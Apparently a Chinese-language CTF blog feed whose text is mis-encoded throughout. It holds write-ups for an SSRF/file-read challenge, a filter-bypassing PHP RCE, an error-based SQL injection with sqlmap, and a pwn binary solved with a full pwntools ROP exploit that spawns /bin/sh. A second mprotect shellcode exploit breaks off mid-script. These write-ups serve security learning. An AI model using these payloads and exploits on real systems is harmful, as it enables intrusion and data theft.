        <content type="html"><![CDATA[<h2 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h2><p><img src="https://pic.imgdb.cn/item/66b6d4f2d9c307b7e955d34f.png"><br>æç¤ºssrfã€‚é¦–å…ˆåœ¨è¾“å…¥æ è¾“å…¥flagï¼Œç»™å‡ºæç¤º</p><p><img src="https://pic.imgdb.cn/item/66b6d503d9c307b7e955df14.png"></p><p>é‚£æˆ‘ä»¬ä¾¿ä½¿ç”¨fileåè®®è¯»å–&#x2F;fl4g</p><p>æç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://pic.imgdb.cn/item/66b6d515d9c307b7e955ea67.png"></p><p>è®¿é—®ha1x1ux1u.php</p><p><img src="https://pic.imgdb.cn/item/66b6d528d9c307b7e955f7a0.png"></p><p>å¾—åˆ°ä¸€æ®µphpä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">#å…³é—­é”™è¯¯æŠ¥å‘Š</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];<span class="comment">#å‚æ•°åä¸ºfile</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;file&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;ä½ è´¥äº†.&quot;</span>);</span><br><span class="line">&#125;<span class="comment">#å¦‚æœå‚æ•°çš„å€¼ä¸­æœ‰fileåˆ™å‡ºé”™ï¼Œä¸æŠ¥é”™åˆ™è¾“å‡ºå‚æ•°å€¼å¯¹åº”æ–‡ä»¶çš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>æ„é€ urlï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url?file=../../../flag</span><br></pre></td></tr></table></figure><p>ä½¿å¾— PHP è„šæœ¬å°è¯•è®¿é—®æ ¹ç›®å½•ä¹‹ä¸Šä¸‰å±‚ç›®å½•ä¸­åä¸º <code>flag</code> çš„æ–‡ä»¶ã€‚</p><p><img src="https://pic.imgdb.cn/item/66b6d541d9c307b7e9560905.png"></p><p>æˆ–ä½¿ç”¨å…¶ä»–åè®®è¿›è¡Œè¯»å–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url?file=php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d557d9c307b7e95617b7.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d56cd9c307b7e956279b.png"></p><h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce</h2><p>è¿›å…¥ç½‘é¡µåä»£ç å®¡è®¡</p><p><img src="https://pic.imgdb.cn/item/66b6d582d9c307b7e9563c97.png"></p><p>å‘ç°é¢˜ç›®å°†å¸¸ç”¨å­—ç¬¦å’Œå¤§å°å†™å­—æ¯éƒ½ç¦æ­¢äº†</p><p>é‚£ä¹ˆè¯•ç€å°†è¦ä¼ å…¥çš„å‘½ä»¤å–åçœ‹çœ‹</p><p><img src="https://pic.imgdb.cn/item/66b6d598d9c307b7e9564bb8.png"></p><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://pic.imgdb.cn/item/66b6d5aad9c307b7e956597d.png"></p><p>å‘ç°å–ååå‡ºæ¥çš„éƒ½æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œè‡ªç„¶ä¸ä¼šè§¦å‘æ­£åˆ™åŒ¹é…çš„æ•ˆæœ</p><p>é‚£ä¹ˆå°†å–ååçš„æ•ˆæœå…ˆè¿›è¡Œurlç¼–ç åå†å–åä¼ å…¥ï¼Œç½‘ç«™è‡ªåŠ¨è¿›è¡Œurlè§£ç åä¾¿å¯ä»¥ç»•è¿‡</p><p>é‚£ä¹ˆè¯•ç€ä¼ å…¥phpinfo();è¯•è¯•</p><p>è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„æ‹¬å·çš„é—®é¢˜ç›´æ¥ä¼ å…¥papinfo()çš„å–å</p><p><img src="https://pic.imgdb.cn/item/66b6d5c0d9c307b7e956699d.png"></p><p>å¹¶æ²¡æœ‰å‡ºç°phpçš„ç•Œé¢ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ„é€ payload</p><p><code>payload=?wllm=(~%8F%97%8F%96%91%99%90)();</code></p><p><img src="https://pic.imgdb.cn/item/66b6d5d7d9c307b7e9567acb.png"></p><p>å‡ºç°äº†phpçš„é¡µé¢è¯´æ˜æˆåŠŸçš„ç»•è¿‡äº†</p><p>é‚£ä¹ˆæ¥ç€æ„é€ system(â€˜ls &#x2F;â€˜)</p><p><img src="https://pic.imgdb.cn/item/66b6d5e9d9c307b7e95689c5.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d5fad9c307b7e95696d1.png"></p><p>ä¼ å…¥<code>payload=?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0)ï¼›</code></p><p><img src="https://pic.imgdb.cn/item/66b6d60fd9c307b7e956a658.png"></p><p>å‘ç°flllllaaaaaaggggggg </p><p>æ„é€ system(â€˜cat flllllaaaaaaggggggg &#x2F;â€˜)</p><p><img src="https://pic.imgdb.cn/item/66b6d61fd9c307b7e956b227.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d62fd9c307b7e956be97.png"></p><p>ä¼ å…¥<code>payload=?wllm=(~%8C%86%8C%8B%9A%92ï¼‰(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</code></p><p>æ‹¿åˆ°flag</p><p><img src="https://pic.imgdb.cn/item/66b6d63fd9c307b7e956ca07.png"></p><h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-error"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-error" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]error"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]error</h2><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><h4 id="é¦–å…ˆè¾“å…¥ä¸€äº›å€¼åˆ¤æ–­é—­åˆç¬¦å·ï¼Œæ³¨å…¥ç±»å‹"><a href="#é¦–å…ˆè¾“å…¥ä¸€äº›å€¼åˆ¤æ–­é—­åˆç¬¦å·ï¼Œæ³¨å…¥ç±»å‹" class="headerlink" title="é¦–å…ˆè¾“å…¥ä¸€äº›å€¼åˆ¤æ–­é—­åˆç¬¦å·ï¼Œæ³¨å…¥ç±»å‹"></a>é¦–å…ˆè¾“å…¥ä¸€äº›å€¼åˆ¤æ–­é—­åˆç¬¦å·ï¼Œæ³¨å…¥ç±»å‹</h4><p><img src="https://pic.imgdb.cn/item/66b6d67dd9c307b7e956f06f.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d68cd9c307b7e956face.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d69fd9c307b7e9570a37.png"></p><p>åˆ¤æ–­å‡ºä½¿ç”¨å•å¼•å·é—­åˆï¼Œæ— å›æ˜¾ä½†æœ‰æŠ¥é”™æç¤ºï¼Œæ‰€ä»¥ä¸ºæŠ¥é”™æ³¨å…¥</p><h4 id="åˆ¤æ–­æœ‰å¤šå°‘åˆ—"><a href="#åˆ¤æ–­æœ‰å¤šå°‘åˆ—" class="headerlink" title="åˆ¤æ–­æœ‰å¤šå°‘åˆ—"></a>åˆ¤æ–­æœ‰å¤šå°‘åˆ—</h4><p><img src="https://pic.imgdb.cn/item/66b6d6bad9c307b7e9571ada.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d6c9d9c307b7e957269f.png"></p><p>æ‰€ä»¥ä¸º3åˆ—</p><h4 id="ä½¿ç”¨extractvalue-å‡½æ•°"><a href="#ä½¿ç”¨extractvalue-å‡½æ•°" class="headerlink" title="ä½¿ç”¨extractvalue()å‡½æ•°"></a>ä½¿ç”¨extractvalue()å‡½æ•°</h4><p>çˆ†åº“å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select database()))),3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d6ded9c307b7e9573305.png"></p><p>çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;))),3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d6edd9c307b7e9573d14.png"></p><p>çˆ†åˆ—å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27;))),3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d6fcd9c307b7e95746fb.png"></p><p>çˆ†flagå€¼</p><p>ç¬¬ä¸€æ®µï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(flag)from test_tb))),3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d70fd9c307b7e95753e6.png"></p><p>ç¬¬äºŒæ®µï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select substring(group_concat(id,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,flag),31,30) from test_tb)))--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d71fd9c307b7e9575e2a.png"></p><p>æ‹¼æ¥å¾—åˆ°flag</p><h3 id="è§£æ³•äºŒï¼ˆsqlmapï¼‰"><a href="#è§£æ³•äºŒï¼ˆsqlmapï¼‰" class="headerlink" title="è§£æ³•äºŒï¼ˆsqlmapï¼‰"></a>è§£æ³•äºŒï¼ˆsqlmapï¼‰</h3><h4 id="åˆ¤æ–­æ³¨å…¥ç±»å‹"><a href="#åˆ¤æ–­æ³¨å…¥ç±»å‹" class="headerlink" title="åˆ¤æ–­æ³¨å…¥ç±»å‹"></a>åˆ¤æ–­æ³¨å…¥ç±»å‹</h4><p><img src="https://pic.imgdb.cn/item/66b6d752d9c307b7e9577d18.png"></p><p>ç»“æœï¼š</p><p><img src="https://pic.imgdb.cn/item/66b6d76ed9c307b7e9578fb2.png"></p><p>â€“batch è‡ªåŠ¨å›ç­”é—®é¢˜</p><p>GETç±»å‹ï¼Œå¯èƒ½æ˜¯ç›²æ³¨æˆ–æŠ¥é”™æ³¨å…¥</p><h4 id="åº“å"><a href="#åº“å" class="headerlink" title="åº“å"></a>åº“å</h4><p><img src="https://pic.imgdb.cn/item/66b6d781d9c307b7e9579d4e.png"></p><p>ç»“æœï¼š</p><p><img src="https://pic.imgdb.cn/item/66b6d795d9c307b7e957ab73.png"></p><p>â€“dbsåˆ—å‡ºåº“å</p><p>åšé¢˜è¿‡ç¨‹ä¸­ä¸€èˆ¬åªç”¨åˆ°å½“å‰æ•°æ®åº“</p><p><img src="https://pic.imgdb.cn/item/66b6d7add9c307b7e957d495.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d7c5d9c307b7e957e794.png"></p><h4 id="è¡¨å"><a href="#è¡¨å" class="headerlink" title="è¡¨å"></a>è¡¨å</h4><p><img src="https://pic.imgdb.cn/item/66b6d7d7d9c307b7e957f643.png"></p><p>ç»“æœ</p><p><img src="https://pic.imgdb.cn/item/66b6d7ead9c307b7e95804b5.png"></p><h4 id="åˆ—å"><a href="#åˆ—å" class="headerlink" title="åˆ—å"></a>åˆ—å</h4><p><img src="https://pic.imgdb.cn/item/66b6d7ffd9c307b7e958130c.png"></p><p>ç»“æœ</p><p><img src="https://pic.imgdb.cn/item/66b6d820d9c307b7e958292f.png"></p><h4 id="flagå€¼"><a href="#flagå€¼" class="headerlink" title="flagå€¼"></a>flagå€¼</h4><p><img src="https://pic.imgdb.cn/item/66b6d831d9c307b7e95833ad.png"></p><p>ç»“æœ</p><p><img src="https://pic.imgdb.cn/item/66b6d846d9c307b7e958429b.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023çƒ§çƒ¤æ‘Šå„¿</title>
      <link href="/posts/54d49677/"/>
      <url>/posts/54d49677/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h1><h3 id="é¦–å…ˆæ‹¿åˆ°æ–‡ä»¶åchecksec"><a href="#é¦–å…ˆæ‹¿åˆ°æ–‡ä»¶åchecksec" class="headerlink" title="é¦–å…ˆæ‹¿åˆ°æ–‡ä»¶åchecksec"></a>é¦–å…ˆæ‹¿åˆ°æ–‡ä»¶åchecksec</h3><p><img src="https://pic.imgdb.cn/item/66b5cf82d9c307b7e9703cce.png"></p><p>å¼€äº†NXå’Œæ ˆä¿æŠ¤</p><h3 id="è¿›å…¥64ä½idaåˆ†æç¨‹åº"><a href="#è¿›å…¥64ä½idaåˆ†æç¨‹åº" class="headerlink" title="è¿›å…¥64ä½idaåˆ†æç¨‹åº"></a>è¿›å…¥64ä½idaåˆ†æç¨‹åº</h3><h4 id="ä¸»å‡½æ•°"><a href="#ä¸»å‡½æ•°" class="headerlink" title="ä¸»å‡½æ•°"></a>ä¸»å‡½æ•°</h4><p><img src="https://pic.imgdb.cn/item/66b5cfdfd9c307b7e9708b3a.png"></p><p>ä¾æ¬¡æŸ¥çœ‹å‡ºç°çš„å‡½æ•°</p><h4 id="menu-å‡½æ•°"><a href="#menu-å‡½æ•°" class="headerlink" title="menu()å‡½æ•°"></a>menu()å‡½æ•°</h4><p><img src="https://pic.imgdb.cn/item/66b5d0bcd9c307b7e971580d.png"></p><p>å‘ç°å½“ownä¸º1æ—¶ä¼šè§¦å‘ä¸‹é¢çš„4ï¼Œ5ï¼Œ0é€‰æ‹©</p><h4 id="pijiu-å‡½æ•°"><a href="#pijiu-å‡½æ•°" class="headerlink" title="pijiu()å‡½æ•°"></a>pijiu()å‡½æ•°</h4><p><img src="https://pic.imgdb.cn/item/66b5d136d9c307b7e971c677.png"></p><p>ä¹±ç çš„å­—åœ¨ç¨‹åºè¿è¡Œæ—¶ä¼šæ­£å¸¸æ˜¾ç¤ºï¼ˆè¿™é‡Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥idaä¸ä¼šï¼Œå°è¯•äº†å‡ ç§ä¿®æ”¹æ–¹æ¡ˆï¼Œè¿˜æ˜¯ä¸è¡Œâ€¦â€¦ï¼‰</p><p>è¿™é‡Œæˆ‘ä»¬çœ‹çº¢æ¡†æ¡†ä½çš„ä¸¤ä¸ªä½ç½®ï¼Œv0-v10çš„ç±»å‹å‡ä¸ºintï¼Œè€Œæˆ‘ä»¬çš„moneyåœ¨å˜åŒ–æ—¶ä¹Ÿæ˜¯ç›´æ¥åŠ äº†v9 * -10è¿™ä¹Ÿå°±æ„å‘³è¿™æˆ‘ä»¬çš„é’±å¯ä»¥æ— é™åˆ¶å¢åŠ </p><h4 id="chuanï¼ˆï¼‰å‡½æ•°ä¸pijiuï¼ˆï¼‰ç±»ä¼¼"><a href="#chuanï¼ˆï¼‰å‡½æ•°ä¸pijiuï¼ˆï¼‰ç±»ä¼¼" class="headerlink" title="chuanï¼ˆï¼‰å‡½æ•°ä¸pijiuï¼ˆï¼‰ç±»ä¼¼"></a>chuanï¼ˆï¼‰å‡½æ•°ä¸pijiuï¼ˆï¼‰ç±»ä¼¼</h4><h4 id="yueï¼ˆï¼‰å‡½æ•°"><a href="#yueï¼ˆï¼‰å‡½æ•°" class="headerlink" title="yueï¼ˆï¼‰å‡½æ•°"></a>yueï¼ˆï¼‰å‡½æ•°</h4><p>æŸ¥çœ‹æˆ‘ä»¬çš„é’±åŒ…ä½™é¢</p><h4 id="vipï¼ˆï¼‰å‡½æ•°"><a href="#vipï¼ˆï¼‰å‡½æ•°" class="headerlink" title="vipï¼ˆï¼‰å‡½æ•°"></a>vipï¼ˆï¼‰å‡½æ•°</h4><p>è¿è¡Œå¯¹åº”çš„ä½ç½®å‘ç°æ˜¯æ‰¿åŒ…æ‘Šä½</p><p><img src="https://pic.imgdb.cn/item/66b5d251d9c307b7e972d2b7.png"></p><p>åˆ†æå‡½æ•°å‘ç°æ‰¿åŒ…æ‘Šä½ä¼šä½¿ä¸Šæ–‡æˆ‘ä»¬æåˆ°çš„ownå€¼å˜ä¸º1ï¼Œè§¦å‘éšè—é€‰æ‹©5ï¼Œè€Œæ‰¿åŒ…æ‘Šä½æ‰€éœ€è¦çš„é’±æˆ‘ä»¬åˆ™å¯ä»¥åˆ©ç”¨pijiuï¼ˆï¼‰&#x2F;chuanï¼ˆï¼‰ä¸­çš„æ¼æ´æ¥ä½¿æˆ‘ä»¬çš„ä½™é¢è¾¾åˆ°æ‰¿åŒ…æ‘Šä½æ‰€éœ€çš„æ•°é‡</p><h4 id="gaming-å‡½æ•°"><a href="#gaming-å‡½æ•°" class="headerlink" title="gaming()å‡½æ•°"></a>gaming()å‡½æ•°</h4><p>æ¥åˆ†æé€‰æ‹©5å¯¹åº”çš„å‡½æ•°</p><p><img src="https://pic.imgdb.cn/item/66b5d373d9c307b7e973e3ce.png"></p><p>æœ‰scanfå‡½æ•°ï¼Œå­˜åœ¨æº¢å‡ºç‚¹</p><p>è¾“å…¥åå°†v5å¤åˆ¶åˆ°name</p><p><img src="https://pic.imgdb.cn/item/66b5d3e4d9c307b7e9746ab0.png"></p><p>å‘ç°nameä½äºdataç«¯</p><p>gdbè°ƒè¯•ï¼ŒvmmapæŸ¥çœ‹dataæ®µæƒé™</p><p><img src="https://pic.imgdb.cn/item/66b5d490d9c307b7e974fcf6.png"></p><p>æ‰€åœ¨ä½ç½®å…·æœ‰è¯»å†™æƒé™</p><p>å¯ä»¥ä½¿ç”¨ret2syscallçš„æ€è·¯</p><h2 id="ret2syscallæ–¹æ³•"><a href="#ret2syscallæ–¹æ³•" class="headerlink" title="ret2syscallæ–¹æ³•"></a>ret2syscallæ–¹æ³•</h2><p>ä½¿ç”¨execve(â€˜&#x2F;bin&#x2F;sh\x00â€™)çš„æ–¹å¼ï¼Œå°†â€™&#x2F;bin&#x2F;sh\x00â€™æ”¾å…¥nameçš„ä½ç½®ï¼Œå°†nameçš„åœ°å€ä½œä¸ºrdiçš„å‚æ•°</p><p>ROPgadgetæŸ¥çœ‹retï¼Œpop rdiç­‰çš„ä½ç½®</p><p><code>expå¦‚ä¸‹ï¼š</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[CISCN 2023 åˆèµ›]çƒ§çƒ¤æ‘Šå„¿</span></span><br><span class="line"><span class="comment">#æ–¹æ³•ä¸€ syscall</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;./shaokao&#x27;</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line"></span><br><span class="line">content = <span class="number">1</span>  <span class="comment">#å…ˆæ‰“æœ¬åœ° æœ¬åœ°æ‰“é€šåè¿æ¥è¿œç¨‹</span></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">    p = process(file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28811</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. å‹‡é—¯å¤©æ¶¯\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;æ¥å‡ ç“¶ï¼Ÿ&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-100000&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040264f : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x000000000040a67e : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000402aae : pop rsp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401b01 : pop rbp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000458827 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004a404b : pop rdx ; pop rbx ; ret</span></span><br><span class="line">rdi_addr = <span class="number">0x40264f</span></span><br><span class="line">rsi_addr = <span class="number">0x40a67e</span></span><br><span class="line">rdx_rbx = <span class="number">0x4a404b</span></span><br><span class="line">rax_addr = <span class="number">0x458827</span></span><br><span class="line">syscall = <span class="number">0x402404</span></span><br><span class="line">name_addr = <span class="number">0x4e60f0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p64(rax_addr) + p64(<span class="number">59</span>) <span class="comment">#å°†execveçš„ç³»ç»Ÿè°ƒç”¨å·59æ”¾å…¥rax</span></span><br><span class="line">payload += p64(rdi_addr) + p64(name_addr) <span class="comment">#å°†/bin/shçš„åœ°å€æ”¾å…¥rdi</span></span><br><span class="line">payload += p64(rsi_addr) + p64(<span class="number">0</span>) <span class="comment">#è®¾ç½®execveå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°NULL</span></span><br><span class="line">payload += p64(rdx_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)<span class="comment">#è®¾ç½®execveçš„ç¬¬ä¸‰ä¸ªå‚æ•°NULLï¼Œrbxèµ‹å€¼0</span></span><br><span class="line">payload += p64(syscall) <span class="comment">#è§¦å‘ç³»ç»Ÿè°ƒç”¨</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="mprotect-å‡½æ•°æ–¹æ³•"><a href="#mprotect-å‡½æ•°æ–¹æ³•" class="headerlink" title="mprotect()å‡½æ•°æ–¹æ³•"></a>mprotect()å‡½æ•°æ–¹æ³•</h2><p>æ‹–è¿›idaåˆ†ææ—¶ï¼Œæˆ‘ä»¬å‘ç°æœ‰mprotect()å‡½æ•°</p><p><code>mprotect()</code> å‡½æ•°æ˜¯ç”¨äºæ”¹å˜å†…å­˜åŒºåŸŸä¿æŠ¤å±æ€§çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚å®ƒå…è®¸ç¨‹åºåŠ¨æ€åœ°æ›´æ”¹å·²ç»æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜é¡µçš„è®¿é—®æƒé™ã€‚è¿™å¯¹äºå®ç°å†…å­˜çš„å®‰å…¨æ€§å’Œçµæ´»æ€§æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚</p><p><code>mprotect()</code> çš„å®šä¹‰é€šå¸¸å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1#include &lt;sys/mman.h&gt;</span><br><span class="line">2</span><br><span class="line">3int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure><h3 id="å‚æ•°è¯´æ˜"><a href="#å‚æ•°è¯´æ˜" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h3><ul><li><strong>addr</strong> (void *)ï¼šæŒ‡é’ˆæŒ‡å‘è¦ä¿®æ”¹ä¿æŠ¤å±æ€§çš„å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€ã€‚</li><li><strong>len</strong> (size_t)ï¼šè¦ä¿®æ”¹ä¿æŠ¤å±æ€§çš„å†…å­˜åŒºåŸŸçš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</li><li>prot(int)ï¼šæ–°çš„ä¿æŠ¤æ ‡å¿—ï¼Œå¯ä»¥æ˜¯ç”±ä»¥ä¸‹æ ‡å¿—ç»„åˆè€Œæˆçš„æ©ç ï¼š<ul><li><code>PROT_NONE</code>ï¼šä¸å…è®¸ä»»ä½•è®¿é—®ã€‚</li><li><code>PROT_READ</code>ï¼šé¡µé¢å¯è¯»ã€‚</li><li><code>PROT_WRITE</code>ï¼šé¡µé¢å¯å†™ã€‚</li><li><code>PROT_EXEC</code>ï¼šé¡µé¢å¯æ‰§è¡Œã€‚</li></ul></li></ul><p>å…¶ä¸­protçš„å€¼ç”±ä¸Šæ–¹å››ä¸ªè§„å®šæ¥å†³å®š</p><p>ä¾‹å¦‚ï¼šport&#x3D;7 7çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸º0111ï¼Œåˆ†åˆ«å¯¹åº”ä¸Šæ–¹å››ä¸ªè§„å®šï¼Œåˆ™port&#x3D;7è¡¨ç¤ºæœ‰è¯»å†™æ‰§è¡Œæƒé™</p><p>è€Œæˆ‘ä»¬å·²çŸ¥nameæ‰€åœ¨çš„dataæ®µåªæœ‰è¯»å†™æƒé™ï¼Œä¸”vmmapæˆ‘ä»¬ä¹Ÿæ‰¾åˆ°äº†æ‰€åœ¨æ•°æ®æ®µçš„èŒƒå›´ï¼Œé‚£ä¹ˆmprotectçš„ä¸‰ä¸ªå‚æ•°æˆ‘ä»¬éƒ½å¯ä»¥ ç¡®å®šäº†</p><p>å°±å¯ä»¥é€šè¿‡mprotect()å‡½æ•°ä¿®æ”¹nameæ‰€åœ¨æ®µçš„æƒé™ï¼Œæ·»åŠ æ‰§è¡Œæƒé™ï¼Œç›´æ¥å‘nameæ‰€åœ¨æ®µä¼ å…¥shellcode</p><p><code>expå¦‚ä¸‹ï¼š</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mprotect()å‡½æ•°ä¸ºnameæ‰€åœ¨dataæ®µå¢åŠ æ‰§è¡Œæƒé™</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;./shaokao&#x27;</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">    p = process(file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28762</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. å‹‡é—¯å¤©æ¶¯\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;æ¥å‡ ç“¶ï¼Ÿ&#x27;</span>)</span><br><span class="line">p.sendline(<span 